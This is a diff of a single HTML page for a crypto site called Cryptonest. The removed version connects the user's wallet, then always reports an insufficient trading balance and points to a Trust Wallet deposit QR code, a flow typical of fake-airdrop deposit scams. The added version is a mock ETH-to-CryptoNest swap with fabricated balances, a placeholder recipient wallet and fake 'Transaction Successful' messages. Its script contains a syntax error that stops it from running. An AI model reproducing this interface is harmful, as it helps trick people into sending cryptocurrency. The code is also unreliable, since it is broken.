@@ -3,373 +3,856 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cryptonest - Crypto Airdrop Trading</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+    <title>Crypto Nest | ETH to CryptoNest Swap</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --primary-color: #28a745;
-            --primary-dark: #1e7e34;
-            --text-color: #333;
-            --light-gray: #f8f9fa;
-            --white: #ffffff;
-            --error-color: #dc3545;
+            --primary: #6c5ce7;
+            --primary-dark: #5649c0;
+            --secondary: #00cec9;
+            --dark: #2d3436;
+            --light: #f5f6fa;
+            --success: #00b894;
+            --danger: #d63031;
+            --warning: #fdcb6e;
+            --gray: #dfe6e9;
         }
 
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Poppins', sans-serif;
+            font-family: 'Inter', sans-serif;
         }
 
         body {
-            background-color: var(--light-gray);
-            color: var(--text-color);
+            background-color: #f8f9fa;
+            color: var(--dark);
             line-height: 1.6;
         }
 
-        #app {
-            max-width: 600px;
+        .container {
+            max-width: 1200px;
             margin: 0 auto;
-            padding: 20px;
-            min-height: 100vh;
-            position: relative;
-        }
-
-        .screen {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            padding: 20px;
-            animation: fadeIn 0.5s ease;
-        }
-
-        .screen.active {
-            display: flex;
+            padding: 0 20px;
         }
 
         header {
-            text-align: center;
-            margin-bottom: 30px;
+            background-color: white;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
+            padding: 20px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
 
-        header h1 {
-            color: var(--primary-color);
-            font-size: 2rem;
-            margin-bottom: 10px;
-        }
-
-        header p {
-            color: #666;
-            font-size: 1rem;
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
 
         .logo {
-            margin: 30px 0;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--primary);
         }
 
-        .logo img {
-            width: 150px;
-            height: 150px;
+        .logo-icon {
+            width: 32px;
+            height: 32px;
+            background-color: var(--primary);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+        }
+
+        .user-wallet {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background-color: var(--light);
+            padding: 8px 16px;
+            border-radius: 20px;
+            font-weight: 500;
+        }
+
+        .user-avatar {
+            width: 32px;
+            height: 32px;
             border-radius: 50%;
-            object-fit: cover;
-            border: 3px solid var(--primary-color);
+            background-color: var(--primary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
         }
 
-        .cta-btn {
-            background-color: var(--primary-color);
-            color: var(--white);
-            border: none;
-            padding: 15px 30px;
-            font-size: 1.1rem;
-            border-radius: 50px;
-            cursor: pointer;
+        main {
+            padding: 40px 0;
+        }
+
+        .dashboard {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+
+        @media (max-width: 768px) {
+            .dashboard {
+                grid-template-columns: 1fr;
+            }
+        }
+
+        .card {
+            background-color: white;
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+        }
+
+        .card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .card-title {
+            font-size: 18px;
             font-weight: 600;
-            transition: all 0.3s ease;
-            margin-top: 20px;
-            width: 100%;
-            max-width: 300px;
+            color: var(--dark);
         }
 
-        .cta-btn:hover {
-            background-color: var(--primary-dark);
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-        }
-
-        .balance-card {
-            background-color: var(--white);
-            border-radius: 15px;
-            padding: 20px;
-            width: 100%;
-            max-width: 400px;
-            text-align: center;
-            margin-bottom: 30px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
-        }
-
-        .balance-card h3 {
-            color: #666;
-            font-size: 1rem;
+        .balance-amount {
+            font-size: 32px;
+            font-weight: 700;
             margin-bottom: 10px;
         }
 
-        .balance-card h2 {
-            color: var(--primary-color);
-            font-size: 2.5rem;
-            font-weight: 700;
+        .balance-change {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            color: var(--success);
+            font-weight: 500;
         }
 
-        .action-buttons {
+        .balance-change.negative {
+            color: var(--danger);
+        }
+
+        .swap-container {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+
+        .swap-card {
+            background-color: white;
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+        }
+
+        .swap-header {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+
+        .swap-title {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .swap-subtitle {
+            color: #636e72;
+            font-size: 14px;
+        }
+
+        .swap-form {
             display: flex;
             flex-direction: column;
-            gap: 15px;
-            width: 100%;
-            max-width: 400px;
+            gap: 20px;
         }
 
-        .action-btn {
-            padding: 15px;
-            border-radius: 10px;
+        .swap-input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .swap-label {
+            font-size: 14px;
+            font-weight: 500;
+            color: var(--dark);
+        }
+
+        .swap-input-container {
+            position: relative;
+        }
+
+        .swap-input {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid var(--gray);
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 500;
+            outline: none;
+            transition: all 0.2s;
+        }
+
+        .swap-input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 2px rgba(108, 92, 231, 0.2);
+        }
+
+        .swap-currency {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-weight: 600;
+            color: var(--dark);
+        }
+
+        .swap-button {
+            background-color: var(--primary);
+            color: white;
             border: none;
-            font-size: 1rem;
+            border-radius: 12px;
+            padding: 16px;
+            font-size: 16px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s ease;
-            width: 100%;
+            transition: all 0.2s;
+            margin-top: 10px;
         }
 
-        .action-btn:not(.inactive) {
-            background-color: var(--primary-color);
-            color: var(--white);
-        }
-
-        .action-btn:not(.inactive):hover {
+        .swap-button:hover {
             background-color: var(--primary-dark);
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
         }
 
-        .action-btn.inactive {
-            background-color: #ccc;
-            color: #666;
+        .swap-button:disabled {
+            background-color: var(--gray);
             cursor: not-allowed;
         }
 
-        .error-msg {
-            color: var(--error-color);
+        .swap-rate {
             text-align: center;
-            margin-top: 20px;
-            font-weight: 500;
-            display: none;
+            font-size: 14px;
+            color: #636e72;
+            margin: 10px 0;
         }
 
-        .payment-slip {
-            background-color: var(--white);
-            padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
-            text-align: center;
-            margin-bottom: 30px;
+        .swap-arrow {
+            display: flex;
+            justify-content: center;
+            margin: 10px 0;
+        }
+
+        .swap-arrow-icon {
+            width: 40px;
+            height: 40px;
+            background-color: var(--light);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--primary);
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .swap-arrow-icon:hover {
+            background-color: var(--gray);
+        }
+
+        .transaction-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s;
+        }
+
+        .transaction-modal.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .transaction-content {
+            background-color: white;
+            border-radius: 16px;
+            padding: 24px;
             width: 100%;
             max-width: 400px;
+            text-align: center;
+            transform: translateY(20px);
+            transition: all 0.3s;
         }
 
-        .payment-slip img {
-            width: 100%;
-            border-radius: 10px;
-            margin-bottom: 20px;
+        .transaction-modal.active .transaction-content {
+            transform: translateY(0);
         }
 
-        .payment-slip p {
-            color: #666;
-        }
-
-        /* Loading Spinner */
-        .spinner {
-            width: 50px;
-            height: 50px;
-            border: 5px solid rgba(40, 167, 69, 0.2);
+        .transaction-icon {
+            width: 80px;
+            height: 80px;
+            background-color: var(--success);
             border-radius: 50%;
-            border-top-color: var(--primary-color);
-            animation: spin 1s ease-in-out infinite;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            color: white;
+            font-size: 32px;
+        }
+
+        .transaction-icon.error {
+            background-color: var(--danger);
+        }
+
+        .transaction-title {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .transaction-message {
+            color: #636e72;
             margin-bottom: 20px;
         }
 
-        #loading-screen p {
-            color: var(--primary-color);
+        .transaction-details {
+            background-color: var(--light);
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .transaction-detail {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+
+        .transaction-detail:last-child {
+            margin-bottom: 0;
+        }
+
+        .transaction-detail-label {
+            color: #636e72;
+        }
+
+        .transaction-detail-value {
+            font-weight: 500;
+        }
+
+        .transaction-button {
+            background-color: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 12px 24px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            width: 100%;
+        }
+
+        .transaction-button:hover {
+            background-color: var(--primary-dark);
+        }
+
+        .wallet-address {
+            font-family: monospace;
+            background-color: var(--light);
+            padding: 8px 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            word-break: break-all;
+            margin-top: 10px;
+        }
+
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background-color: var(--success);
+            color: white;
+            padding: 16px 24px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            z-index: 1000;
+            transform: translateX(120%);
+            transition: all 0.3s;
+        }
+
+        .notification.show {
+            transform: translateX(0);
+        }
+
+        .notification.error {
+            background-color: var(--danger);
+        }
+
+        .notification-icon {
+            font-size: 20px;
+        }
+
+        .history-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 0;
+            border-bottom: 1px solid var(--gray);
+        }
+
+        .history-item:last-child {
+            border-bottom: none;
+        }
+
+        .history-details {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .history-icon {
+            width: 40px;
+            height: 40px;
+            background-color: rgba(108, 92, 231, 0.1);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--primary);
+        }
+
+        .history-info h4 {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .history-info p {
+            font-size: 12px;
+            color: #636e72;
+        }
+
+        .history-amount {
             font-weight: 600;
         }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+        .history-amount.positive {
+            color: var(--success);
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
+        .history-amount.negative {
+            color: var(--danger);
         }
 
-        /* Responsive adjustments */
-        @media (max-width: 480px) {
-            header h1 {
-                font-size: 1.5rem;
-            }
-            
-            .balance-card h2 {
-                font-size: 2rem;
-            }
-            
-            .cta-btn, .action-btn {
-                padding: 12px;
-                font-size: 0.9rem;
-            }
+        .empty-state {
+            text-align: center;
+            padding: 40px 0;
+            color: #636e72;
+        }
+
+        .empty-state-icon {
+            font-size: 48px;
+            margin-bottom: 16px;
+            color: var(--gray);
         }
     </style>
 </head>
 <body>
-    <div id="app">
-        <!-- Home Screen -->
-        <div id="home-screen" class="screen active">
-            <header>
-                <h1>Cryptonest</h1>
-                <p>Your gateway to crypto airdrop trading</p>
-            </header>
-            <div class="logo">
-                <img src="https://via.placeholder.com/150" alt="Cryptonest Logo">
-            </div>
-            <button id="create-account-btn" class="cta-btn">Create My Trading Account</button>
-        </div>
-
-        <!-- Loading Screen -->
-        <div id="loading-screen" class="screen">
-            <div class="spinner"></div>
-            <p>Connecting to your wallet...</p>
-        </div>
-
-        <!-- Dashboard Screen -->
-        <div id="dashboard-screen" class="screen">
-            <header>
-                <h1>Welcome, <span id="user-name">User</span></h1>
-                <p>Your trading dashboard</p>
-            </header>
-            
-            <div class="balance-card">
-                <h3>Trading Account Balance</h3>
-                <h2 id="account-balance">$0.00</h2>
-            </div>
-            
-            <div class="action-buttons">
-                <button id="trade-now-btn" class="action-btn inactive">Start Trading Now</button>
-                <button id="deposit-btn" class="action-btn">Deposit to My Wallet</button>
-            </div>
-            
-            <div id="insufficient-balance-msg" class="error-msg">
-                Insufficient trade balance. Deposit to your trade wallet first.
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">
+                    <div class="logo-icon">CN</div>
+                    <span>Crypto Nest</span>
+                </div>
+                <div class="user-wallet">
+                    <div class="user-avatar">U</div>
+                    <span id="userEthBalance">0 ETH</span>
+                </div>
             </div>
         </div>
+    </header>
 
-        <!-- Deposit Screen -->
-        <div id="deposit-screen" class="screen">
-            <header>
-                <h1>Deposit Funds</h1>
-                <p>Scan to deposit to your wallet</p>
-            </header>
-            
-            <div class="payment-slip">
-                <img src="https://via.placeholder.com/300x450?text=Trust+Wallet+Payment+Slip" alt="Trust Wallet Payment Slip">
-                <p>Scan this QR code with Trust Wallet to deposit funds</p>
+    <main>
+        <div class="container">
+            <div class="dashboard">
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">ETH Balance</div>
+                        <i class="fas fa-ethereum"></i>
+                    </div>
+                    <div class="balance-amount" id="ethBalanceAmount">0.00 ETH</div>
+                    <div class="balance-change">
+                        <i class="fas fa-arrow-up"></i>
+                        <span>0.00%</span>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <div class="card-header">
+                        <div class="card-title">CryptoNest Balance</div>
+                        <i class="fas fa-coins" style="color: var(--primary);"></i>
+                    </div>
+                    <div class="balance-amount" id="cnBalanceAmount">0.00 CN</div>
+                    <div class="balance-change">
+                        <i class="fas fa-arrow-up"></i>
+                        <span>0.00%</span>
+                    </div>
+                </div>
             </div>
+
+            <div class="swap-container">
+                <div class="swap-card">
+                    <div class="swap-header">
+                        <h2 class="swap-title">Swap Crypto</h2>
+                        <p class="swap-subtitle">Instantly exchange ETH for CryptoNest coins</p>
+                    </div>
+
+                    <div class="swap-form">
+                        <div class="swap-input-group">
+                            <label class="swap-label">You pay</label>
+                            <div class="swap-input-container">
+                                <input type="number" id="ethAmount" class="swap-input" placeholder="0.0" min="0" step="0.01">
+                                <span class="swap-currency">ETH</span>
+                            </div>
+                        </div>
+
+                        <div class="swap-arrow">
+                            <div class="swap-arrow-icon">
+                                <i class="fas fa-arrow-down"></i>
+                            </div>
+                        </div>
+
+                        <div class="swap-input-group">
+                            <label class="swap-label">You receive</label>
+                            <div class="swap-input-container">
+                                <input type="number" id="cnAmount" class="swap-input" placeholder="0.0" readonly>
+                                <span class="swap-currency">CN</span>
+                            </div>
+                        </div>
+
+                        <div class="swap-rate">
+                            <span id="exchangeRate">1 ETH = 1000 CN</span>
+                        </div>
+
+                        <button id="swapButton" class="swap-button" disabled>Swap Now</button>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card" style="margin-top: 40px;">
+                <div class="card-header">
+                    <div class="card-title">Transaction History</div>
+                </div>
+                <div id="transactionHistory">
+                    <div class="empty-state">
+                        <div class="empty-state-icon">
+                            <i class="fas fa-exchange-alt"></i>
+                        </div>
+                        <h3>No transactions yet</h3>
+                        <p>Your swap history will appear here</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <div class="transaction-modal" id="transactionModal">
+        <div class="transaction-content">
+            <div class="transaction-icon" id="transactionIcon">
+                <i class="fas fa-spinner fa-spin"></i>
+            </div>
+            <h3 class="transaction-title" id="transactionTitle">Processing Transaction</h3>
+            <p class="transaction-message" id="transactionMessage">Please wait while we process your transaction.</p>
             
-            <button id="back-to-dashboard-btn" class="action-btn">Back to Dashboard</button>
+            <div class="transaction-details">
+                <div class="transaction-detail">
+                    <span class="transaction-detail-label">From:</span>
+                    <span class="transaction-detail-value">Your Wallet</span>
+                </div>
+                <div class="transaction-detail">
+                    <span class="transaction-detail-label">To:</span>
+                    <span class="transaction-detail-value">CryptoNest</span>
+                </div>
+                <div class="transaction-detail">
+                    <span class="transaction-detail-label">Amount:</span>
+                    <span class="transaction-detail-value" id="transactionAmount">0 ETH</span>
+                </div>
+                <div class="transaction-detail">
+                    <span class="transaction-detail-label">Network Fee:</span>
+                    <span class="transaction-detail-value" id="transactionFee">0.001 ETH</span>
+                </div>
+            </div>
+
+            <div id="walletAddressContainer" style="display: none;">
+                <p>ETH sent to:</p>
+                <div class="wallet-address">#mymemecoinwalletaddress</div>
+            </div>
+
+            <button class="transaction-button" id="confirmButton">Confirm</button>
         </div>
     </div>
 
+    <div class="notification" id="notification">
+        <div class="notification-icon">
+            <i class="fas fa-check-circle"></i>
+        </div>
+        <div class="notification-message">Transaction completed successfully!</div>
+    </div>
+
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            // DOM Elements
-            const createAccountBtn = document.getElementById('create-account-btn');
-            const tradeNowBtn = document.getElementById('trade-now-btn');
-            const depositBtn = document.getElementById('deposit-btn');
-            const backToDashboardBtn = document.getElementById('back-to-dashboard-btn');
-            const insufficientBalanceMsg = document.getElementById('insufficient-balance-msg');
-            const userNameElement = document.getElementById('user-name');
-            const accountBalanceElement = document.getElementById('account-balance');
+        // Constants
+        const EXCHANGE_RATE = 1000; // 1 ETH = 1000 CN
+        const NETWORK_FEE = 0.001; // Fixed network fee in ETH
+        const WALLET_ADDRESS = "#mymemecoinwalletaddress";
+
+        // DOM Elements
+        const ethAmountInput = document.getElementById('ethAmount');
+        const cnAmountInput = document.getElementById('cnAmount');
+        const swapButton = document.getElementById('swapButton');
+        const exchangeRateText = document.getElementById('exchangeRate');
+        const ethBalanceAmount = document.getElementById('ethBalanceAmount');
+        const cnBalanceAmount = document.getElementById('cnBalanceAmount');
+        const userEthBalance = document.getElementById('userEthBalance');
+        const transactionModal = document.getElementById('transactionModal');
+        const transactionIcon = document.getElementById('transactionIcon');
+        const transactionTitle = document.getElementById('transactionTitle');
+        const transactionMessage = document.getElementById('transactionMessage');
+        const transactionAmount = document.getElementById('transactionAmount');
+        const transactionFee = document.getElementById('transactionFee');
+        const confirmButton = document.getElementById('confirmButton');
+        const walletAddressContainer = document.getElementById('walletAddressContainer');
+        const notification = document.getElementById('notification');
+        const transactionHistory = document.getElementById('transactionHistory');
+
+        // Initialize user data
+        let userData = {
+            ethBalance: 10, // Starting with 10 ETH for demo purposes
+            cnBalance: 0,
+            transactions: []
+        };
+
+        // Load data from localStorage
+        function loadUserData() {
+            const savedData = localStorage.getItem('cryptoNestUserData');
+            if (savedData) {
+                userData = JSON.parse(savedData);
+            }
+            updateBalances();
+            renderTransactionHistory();
+        }
+
+        // Save data to localStorage
+        function saveUserData() {
+            localStorage.setItem('cryptoNestUserData', JSON.stringify(userData));
+        }
+
+        // Update balance displays
+        function updateBalances() {
+            ethBalanceAmount.textContent = `${userData.ethBalance.toFixed(4)} ETH`;
+            cnBalanceAmount.textContent = `${userData.cnBalance.toFixed(2)} CN`;
+            userEthBalance.textContent = `${userData.ethBalance.toFixed(4)} ETH`;
+        }
+
+        // Calculate CN amount based on ETH input
+        function calculateCnAmount(ethAmount) {
+            return ethAmount * EXCHANGE_RATE;
+        }
+
+        // Calculate ETH amount based on CN input
+        function calculateEthAmount(cnAmount) {
+            return cnAmount / EXCHANGE_RATE;
+        }
+
+        // Format transaction date
+        function formatTransactionDate(date) {
+            return new Date(date).toLocaleString();
+        }
+
+        // Render transaction history
+        function renderTransactionHistory() {
+            if (userData.transactions.length === 0) {
+                transactionHistory.innerHTML = `
+                    <div class="empty-state">
+                        <div class="empty-state-icon">
+                            <i class="fas fa-exchange-alt"></i>
+                        </div>
+                        <h3>No transactions yet</h3>
+                        <p>Your swap history will appear here</p>
+                    </div>
+                `;
+                return;
+            }
+
+            transactionHistory.innerHTML = '';
+            userData.transactions.slice().reverse().forEach(tx => {
+                const transactionElement = document.createElement('div');
+                transactionElement.className = 'history-item';
+                transactionElement.innerHTML = `
+                    <div class="history-details">
+                        <div class="history-icon">
+                            <i class="fas fa-exchange-alt"></i>
+                        </div>
+                        <div class="history-info">
+                            <h4>ETH to CN Swap</h4>
+                            <p>${formatTransactionDate(tx.date)}</p>
+                        </div>
+                    </div>
+                    <div class="history-amount ${tx.type === 'in' ? 'positive' : 'negative'}">
+                        ${tx.type === 'in' ? '+' : '-'}${tx.amount.toFixed(tx.type === 'in' ? 2 : 4)} ${tx.type === 'in' ? 'CN' : 'ETH'}
+                    </div>
+                `;
+                transactionHistory.appendChild(transactionElement);
+            });
+        }
+
+        // Show notification
+        function showNotification(message, isError = false) {
+            const notificationMessage = notification.querySelector('.notification-message');
+            const notificationIcon = notification.querySelector('.notification-icon i');
             
-            // Screens
-            const homeScreen = document.getElementById('home-screen');
-            const loadingScreen = document.getElementById('loading-screen');
-            const dashboardScreen = document.getElementById('dashboard-screen');
-            const depositScreen = document.getElementById('deposit-screen');
+            notificationMessage.textContent = message;
+            notification.className = isError ? 'notification error' : 'notification';
+            notificationIcon.className = isError ? 'fas fa-times-circle' : 'fas fa-check-circle';
             
-            // Initialize Web3
-            let web3;
-            let userAccount = null;
+            notification.classList.add('show');
             
-            // Check if Web3 is injected (MetaMask)
-            if (window.ethereum) {
-                web3 = new Web3(window.ethereum);
-            } else {
-                alert('Please install MetaMask or another Web3 provider to use this dApp!');
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+
+        // Process swap transaction
+        function processSwap(ethAmount) {
+            // Calculate amounts
+            const cnAmount = calculateCnAmount(ethAmount);
+            const totalEthAmount = parseFloat(ethAmount) + NETWORK_FEE;
+            
+            // Validate sufficient balance
+            if (totalEthAmount > userData.ethBalance) {
+                showNotification("Insufficient ETH balance", true);
+                return false;
             }
             
-            // Event Listeners
-            createAccountBtn.addEventListener('click', connectWallet);
-            tradeNowBtn.addEventListener('click', showInsufficientBalance);
-            depositBtn.addEventListener('click', showDepositScreen);
-            backToDashboardBtn.addEventListener('click', showDashboard);
+            // Show processing modal
+            transactionModal.classList.add('active');
+            transactionIcon.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
+            transactionTitle.textContent = "Processing Transaction";
+            transactionMessage.textContent = "Please wait while we process your transaction.";
+            transactionAmount.textContent = `${ethAmount} ETH`;
+            transactionFee.textContent = `${NETWORK_FEE} ETH`;
+            walletAddressContainer.style.display = 'none';
+            confirmButton.style.display = 'none';
             
-            // Functions
-            async function connectWallet() {
-                try {
-                    // Show loading screen
-                    homeScreen.classList.remove('active');
-                    loadingScreen.classList.add('active');
-                    
-                    // Request account access
-                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                    userAccount = accounts[0];
-                    
-                    // Get user name (shortened address)
-                    const userName = `${userAccount.substring(0, 6)}...${userAccount.substring(userAccount.length - 4)}`;
-                    userNameElement.textContent = userName;
-                    
-                    // Simulate loading delay
-                    setTimeout(() => {
-                        loadingScreen.classList.remove('active');
-                        dashboardScreen.classList.add('active');
-                    }, 1500);
-                    
-                } catch (error) {
-                    console.error('Error connecting wallet:', error);
-                    loadingScreen.classList.remove('active');
-                    homeScreen.classList.add('active');
-                    alert('Failed to connect wallet. Please try again.');
-                }
-            }
-            
-            function showInsufficientBalance() {
-                insufficientBalanceMsg.style.display = 'block';
+            // Simulate blockchain processing delay
+            setTimeout(() => {
+                // Update balances
+                userData.ethBalance -= totalEthAmount;
+                userData.cnBalance += cnAmount;
                 
-                // Hide message after 3 seconds
-                setTimeout(() => {
-                    insufficientBalanceMsg.style.display = 'none';
-                }, 3000);
+                // Add transaction to history
+                userData.transactions.push({
+                    type: 'out',
+                    amount: parseFloat(ethAmount),
+                    date: new Date().toISOString()
+                });
+                
+                userData.transactions.push({
+                    type: 'in',
+                    amount: cnAmount,
+                    date: new Date().toISOString()
+                });
+                
+                // Save data
+                saveUserData();
+                updateBalances();
+                renderTransactionHistory();
+                
+                // Update modal to show success
+                transactionIcon.innerHTML = '<i class="fas fa-check"></i>';
+                transactionIcon.className = 'transaction-icon';
+                transactionTitle.textContent = "Transaction Successful!";
+                transactionMessage.textContent = `You have successfully swapped ${ethAmount} ETH for ${cnAmount} CN.`;
+                walletAddressContainer.style.display = 'block';
+                confirmButton.textContent = "Done";
+                confirmButton.style.display = 'block';
+                
+                // Show notification
+                showNotification(`Successfully swapped ${ethAmount} ETH for ${cnAmount} CN`);
+            }, 2000);
+            
+            return true;
+        }
+
+        // Event Listeners
+        ethAmountInput.addEventListener('input', () => {
+            const ethAmount = parseFloat(ethAmountInput.value);
+            
+            if (isNaN(ethAmount) {
+                cnAmountInput.value = '';
+                swapButton.disabled = true;
+                return;
             }
             
-            function showDepositScreen() {
-                dashboardScreen.classList.remove('active');
-                depositScreen.classList.add('active');
-            }
+            const cnAmount = calculateCnAmount(ethAmount);
+            cnAmountInput.value = cnAmount.toFixed(2);
+            swapButton.disabled = ethAmount <= 0;
             
-            function showDashboard() {
-                depositScreen.classList.remove('active');
-                dashboardScreen.classList.add('active');
-            }
+            // Update exchange rate display
+            exchangeRateText.textContent = `1 ETH = ${EXCHANGE_RATE} CN`;
+        });
+
+        swapButton.addEventListener('click', () => {
+            const ethAmount = parseFloat(ethAmountInput.value);
+            processSwap(ethAmount);
+        });
+
+        confirmButton.addEventListener('click', () => {
+            transactionModal.classList.remove('active');
+            ethAmountInput.value = '';
+            cnAmountInput.value = '';
+            swapButton.disabled = true;
+        });
+
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            loadUserData();
             
-            // Initialize with home screen active
-            homeScreen.classList.add('active');
+            // Set exchange rate
+            exchangeRateText.textContent = `1 ETH = ${EXCHANGE_RATE} CN`;
         });
     </script>
 </body>
